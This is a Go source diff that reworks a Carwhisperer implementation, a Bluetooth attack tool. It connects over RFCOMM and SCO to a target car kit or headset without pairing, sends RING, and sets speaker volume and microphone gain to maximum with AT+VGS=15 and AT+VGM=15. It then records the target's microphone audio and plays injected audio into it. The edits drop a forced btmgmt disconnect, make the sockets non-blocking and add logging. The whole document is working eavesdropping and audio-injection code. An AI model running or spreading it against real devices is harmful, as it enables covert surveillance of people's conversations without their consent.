@@ -74,10 +74,8 @@ func Carwhisperer(ctx context.Context, hci, address, recordPath, playPath string
 	if lerr != nil {
 		return fmt.Errorf("local adapter address: %w", lerr)
 	}
-	// Match the original C tool: no pairing step. If another profile holds the
-	// ACL, drop it so RFCOMM can create its own channel.
-	disconnectBluetooth(hciName, address)
-	time.Sleep(500 * time.Millisecond)
+	// Match the original C tool: no pairing step and no pre-emptive
+	// disconnect; connect RFCOMM directly.
 
 	var record io.Writer
 	if recordAudio {
@@ -120,7 +118,6 @@ func Carwhisperer(ctx context.Context, hci, address, recordPath, playPath string
 			break
 		}
 		emit("RFCOMM channel busy (%v); retrying...", err)
-		disconnectBluetooth(hciName, address)
 		time.Sleep(700 * time.Millisecond)
 	}
 	if err != nil {
@@ -128,9 +125,9 @@ func Carwhisperer(ctx context.Context, hci, address, recordPath, playPath string
 	}
 	defer unix.Close(rfd)
 	emit("RFCOMM connected to %s", FormatBDAddr(addr))
+	_ = unix.SetNonblock(rfd, true)
 
-	// Original Carwhisperer sends RING before opening SCO so the target
-	// treats the SCO audio as an in-band ringtone / incoming call.
+	// Original C order: RING, 1 ms, then SCO.
 	_, _ = unix.Write(rfd, []byte("RING\r\n"))
 	time.Sleep(1 * time.Millisecond)
 
@@ -139,14 +136,14 @@ func Carwhisperer(ctx context.Context, hci, address, recordPath, playPath string
 		return fmt.Errorf("connect SCO audio: %w", err)
 	}
 	defer unix.Close(sfd)
-	setRecvTimeout(sfd)
+	_ = unix.SetNonblock(sfd, true)
 	emit("SCO audio connected")
 
 	// Maximum speaker volume and microphone gain.
 	for _, cmd := range []string{"AT+VGS=15\r\n", "AT+VGM=15\r\n", "RING\r\n"} {
 		_, _ = unix.Write(rfd, []byte(cmd))
-		time.Sleep(2 * time.Millisecond)
 	}
+
 	emit("Recording to %s", recordPath)
 
 	done := make(chan struct{})
@@ -164,7 +161,7 @@ func Carwhisperer(ctx context.Context, hci, address, recordPath, playPath string
 	wg.Add(2)
 	go func() {
 		defer wg.Done()
-		carwhispererRFCOMM(ctx, rfd)
+		carwhispererRFCOMM(ctx, rfd, emit)
 	}()
 	go func() {
 		defer wg.Done()
@@ -176,15 +173,6 @@ func Carwhisperer(ctx context.Context, hci, address, recordPath, playPath string
 		return ctx.Err()
 	}
 	return nil
-}
-
-func disconnectBluetooth(hciName, address string) {
-	if _, err := exec.LookPath("btmgmt"); err != nil {
-		return
-	}
-	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
-	defer cancel()
-	_ = exec.CommandContext(ctx, "btmgmt", "-i", hciName, "disconnect", NormalizeAddr(address)).Run()
 }
 
 func prepareCarwhispererAdapter(hciName string) error {
@@ -288,7 +276,7 @@ func openRFCOMM(local, remote [6]byte, channel int) (int, error) {
 			return -1, werr
 		}
 	}
-	setRecvTimeout(fd)
+	_ = unix.SetNonblock(fd, true)
 	return fd, nil
 }
 
@@ -334,7 +322,7 @@ func openSCO(local, remote [6]byte) (int, error) {
 		unix.Close(fd)
 		return -1, err
 	}
-	setRecvTimeout(fd)
+	_ = unix.SetNonblock(fd, true)
 	return fd, nil
 }
 
@@ -362,12 +350,7 @@ func connectSCO(fd int, addr [6]byte) error {
 	return waitWritable(fd)
 }
 
-func setRecvTimeout(fd int) {
-	tv := unix.Timeval{Sec: 0, Usec: 200000}
-	_ = unix.SetsockoptTimeval(fd, unix.SOL_SOCKET, unix.SO_RCVTIMEO, &tv)
-}
-
-func carwhispererRFCOMM(ctx context.Context, fd int) {
+func carwhispererRFCOMM(ctx context.Context, fd int, emit func(string, ...any)) {
 	buf := make([]byte, 512)
 	var pending string
 	for ctx.Err() == nil {
@@ -379,10 +362,15 @@ func carwhispererRFCOMM(ctx context.Context, fd int) {
 				if idx < 0 {
 					break
 				}
-				line := pending[:idx]
+				line := strings.TrimSpace(pending[:idx])
 				pending = pending[idx+1:]
-				if resp := rfcommResponse(line); resp != "" {
-					rfcommWrite(fd, resp)
+				if line != "" {
+					resp := rfcommResponse(line)
+					emit("RFCOMM < %s", line)
+					if resp != "" {
+						emit("RFCOMM > %s", strings.TrimSpace(resp))
+						rfcommWrite(fd, resp)
+					}
 				}
 			}
 		}
@@ -390,6 +378,7 @@ func carwhispererRFCOMM(ctx context.Context, fd int) {
 			continue
 		}
 		if err == unix.EAGAIN || err == unix.EWOULDBLOCK || err == unix.EINTR {
+			time.Sleep(5 * time.Millisecond)
 			continue
 		}
 		if ctx.Err() != nil {
@@ -468,6 +457,7 @@ func carwhispererSCO(ctx context.Context, fd int, record io.Writer, play *os.Fil
 			continue
 		}
 		if err == unix.EAGAIN || err == unix.EWOULDBLOCK || err == unix.EINTR {
+			time.Sleep(5 * time.Millisecond)
 			continue
 		}
 		if ctx.Err() != nil {
